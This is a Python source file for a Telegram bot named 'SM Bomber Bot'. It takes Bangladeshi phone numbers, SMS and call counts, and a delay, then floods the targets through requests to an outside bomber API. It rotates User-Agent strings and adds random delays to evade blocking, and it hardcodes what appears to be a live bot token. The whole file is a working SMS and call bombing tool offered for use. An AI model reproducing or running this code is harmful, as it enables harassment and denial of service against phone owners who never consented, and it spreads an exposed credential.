import telebot
import requests
import time
import random
import sqlite3
from datetime import datetime
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Bot token
TOKEN = "7619796671:AAFLnz5d1SSh1jhJakaoR7Ny9dXNWMT_0qA"
ADMIN_ID = None  # Admin ID blank rakha holo, tui pore set korte parbi

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# Initialize SQLite database
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    last_command_time TEXT
                )''')
conn.commit()

# User-Agent list for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
]

# Keyboard markup
def create_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("/start"))
    markup.add(KeyboardButton("/bomb"))
    if ADMIN_ID:
        markup.add(KeyboardButton("/i5d"))
    return markup

# Save user info to database
def save_user_info(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    last_command_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    cursor.execute('''INSERT OR REPLACE INTO users (user_id, username, first_name, last_name, last_command_time)
                     VALUES (?, ?, ?, ?, ?)''', (user_id, username, first_name, last_name, last_command_time))
    conn.commit()

# Start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    save_user_info(message)
    bot.reply_to(message, "🍁✨ Welcome to SM Bomber Bot ✨🍁\n"
                          "Use /bomb to start bombing.\n"
                          "Designed by: SM", reply_markup=create_menu())

# Bomb command
@bot.message_handler(commands=['bomb'])
def bomb_command(message):
    save_user_info(message)
    bot.reply_to(message, "Enter phone numbers (comma-separated, e.g., 01712345678,01987654321):")
    bot.register_next_step_handler(message, get_phone_numbers)

def get_phone_numbers(message):
    save_user_info(message)
    phone_numbers = [num.strip() for num in message.text.split(",")]
    if not all(num.startswith("01") and num.isdigit() and len(num) == 11 for num in phone_numbers):
        bot.reply_to(message, "Invalid phone numbers! Must be 11 digits starting with 01.")
        return
    bot.reply_to(message, "Enter SMS count (0-100):")
    bot.register_next_step_handler(message, lambda m: get_sms_count(m, phone_numbers))

def get_sms_count(message, phone_numbers):
    save_user_info(message)
    try:
        sms_count = int(message.text)
        if not (0 <= sms_count <= 100):
            raise ValueError
    except ValueError:
        bot.reply_to(message, "SMS count must be between 0 and 100!")
        return
    bot.reply_to(message, "Enter call count (0-100):")
    bot.register_next_step_handler(message, lambda m: get_call_count(m, phone_numbers, sms_count))

def get_call_count(message, phone_numbers, sms_count):
    save_user_info(message)
    try:
        call_count = int(message.text)
        if not (0 <= call_count <= 100):
            raise ValueError
        if sms_count == 0 and call_count == 0:
            bot.reply_to(message, "Both SMS and Call counts cannot be 0!")
            return
    except ValueError:
        bot.reply_to(message, "Call count must be between 0 and 100!")
        return
    bot.reply_to(message, "Enter delay (seconds, e.g., 2):")
    bot.register_next_step_handler(message, lambda m: get_delay(m, phone_numbers, sms_count, call_count))

def get_delay(message, phone_numbers, sms_count, call_count):
    save_user_info(message)
    try:
        delay = float(message.text)
        if delay < 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "Delay must be non-negative!")
        return
    start_bombing(message, phone_numbers, sms_count, call_count, delay)

# Bombing logic
def start_bombing(message, phone_numbers, sms_count, call_count, delay):
    total_requests = (sms_count + call_count) * len(phone_numbers)
    request_counter = 0
    bot.reply_to(message, "Starting bombing...")

    for phone in phone_numbers:
        requests_list = [{"type": "sms", "phone": phone} for _ in range(sms_count)] + \
                       [{"type": "call", "phone": phone} for _ in range(call_count)]
        random.shuffle(requests_list)

        bot.reply_to(message, f"Bombing number: {phone}")
        for req in requests_list:
            request_counter += 1
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            url = f"https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone={req['phone']}&type={req['type']}"
            try:
                response = requests.get(url, headers=headers, timeout=10)
                status = f"Success (HTTP {response.status_code})" if response.status_code == 200 else f"Unsuccessful (HTTP {response.status_code})"
                success = response.status_code == 200
            except requests.RequestException as e:
                status = f"Unsuccessful: {str(e)}"
                success = False
            bot.reply_to(message, f"[{request_counter}/{total_requests}] Trial API ({req['type'].upper()} to {phone}): {status}")
            time.sleep(delay + random.uniform(0.1, 0.5))  # Random delay to avoid API block

    bot.reply_to(message, "Bombing completed successfully!", reply_markup=create_menu())

# Admin command to show user info
@bot.message_handler(commands=['i5d'])
def show_users(message):
    if not ADMIN_ID or message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "This command is for admin only!")
        return
    save_user_info(message)
    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()
    if not users:
        bot.reply_to(message, "No users found!")
        return
    response = "User Info:\n"
    for user in users:
        response += (f"User ID: {user[0]}\n"
                     f"Username: {user[1]}\n"
                     f"First Name: {user[2]}\n"
                     f"Last Name: {user[3]}\n"
                     f"Last Command: {user[4]}\n"
                     f"{'-'*20}\n")
    bot.reply_to(message, response, reply_markup=create_menu())

# Start polling
bot.polling()
